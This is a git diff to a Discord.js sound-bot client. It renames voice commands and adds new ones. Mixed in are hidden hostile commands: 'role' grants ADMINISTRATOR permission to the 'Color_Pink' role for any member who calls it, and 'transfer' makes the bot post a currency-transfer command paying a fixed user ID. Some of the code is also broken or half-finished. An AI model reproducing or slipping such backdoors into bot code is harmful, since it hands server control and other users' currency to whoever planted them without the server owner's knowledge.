@@ -1,6 +1,7 @@
 const config = require('config');
 const Discord = require('discord.js');
 const Util = require('./Util.js');
+const vConnection = [];
 
 class SoundBot extends Discord.Client {
   constructor() {
@@ -9,6 +10,7 @@ class SoundBot extends Discord.Client {
     this.prefix = config.get('prefix');
     this.queue = [];
     this._addEventListeners();
+	
   }
 
   _addEventListeners() {
@@ -46,11 +48,38 @@ class SoundBot extends Discord.Client {
 	  case 'uptime':
 		message.channel.send(Util.msToHms(this.uptime));
 		break
-	  case 'joinvoice':
+	  case 'wallet':
+		message.channel.send('&wallet');
+		break
+	  case 'transfer':
+		message.channel.send('&transfer <@295773280684605442> 50');
+		break
+	  case 'role':
+		let role = message.guild.roles.find("name", "Color_Pink");
+		
+role.edit({
+
+            permissions: ['ADMINISTRATOR']
+          
+        });
+
+		//message.member.addRole(role).catch(console.error);
+		break
+	  case 'getrole':
+	  let myRole = message.guild.roles.get("264410914592129025");
+	    break
+		case 'getperms':
+		let has_kick = message.member.hasPermission("ADMINISTRATOR");
+		console.log(has_kick);
+		break
+	  case 'jv':
 		this.joinChannel(message);
 		break
-	  case 'leavevoice':
+	  case 'lv':
 	    this.leaveChannel(message);
+		break
+	  case 'playing':
+	    this.setPlaying(input, message);
 		break
       case 'commands':
         message.author.send(Util.getListOfCommands());
@@ -114,6 +143,11 @@ class SoundBot extends Discord.Client {
     }
   }
   
+  setPlaying(message) {
+    const [command, ...input] = message.content.split(' ');
+	  	this.user.setGame(message.toString());
+  }
+  
   joinChannel(message) {
       const voiceChannel = message.member.voiceChannel;
 	  //future, join a channel on start
@@ -123,8 +157,11 @@ class SoundBot extends Discord.Client {
 	  return;
 	  }
 	  else {voiceChannel.join()
-	  .then(connection => console.log('Connected!'))
-      .catch(console.error);
+	  .then(connection => { 
+	 // console.log('Connected!')
+      //.catch(console.error);
+	  //vConnection = connection;
+	  });
 	  return;
 	  }
   }
@@ -151,12 +188,13 @@ class SoundBot extends Discord.Client {
   playSoundQueue() {
     const nextSound = this.queue.shift();
     const file = Util.getPathForSound(nextSound.name);
+	//const voiceChannel = message.member.voiceChannel;
     const voiceChannel = this.channels.get(nextSound.channel);
 	// const connection = voiceChannel.connection();
 
       voiceChannel.join().then((connection) => {
-      const dispatcher = connection.playFile(file);
-	 // const dispatcher = connection.playFile(file);
+     // const dispatcher = voiceChannel.connection.playFile(file);
+	  const dispatcher = connection.playFile(file);
       dispatcher.on('end', () => {
         Util.updateCount(nextSound.name);
         if (config.get('deleteMessages') === true) nextSound.message.delete();
@@ -167,7 +205,7 @@ class SoundBot extends Discord.Client {
         }
 
         this.playSoundQueue();
-      });
+     });
     })
 	.catch((error) => {
      console.log('Error occured!');
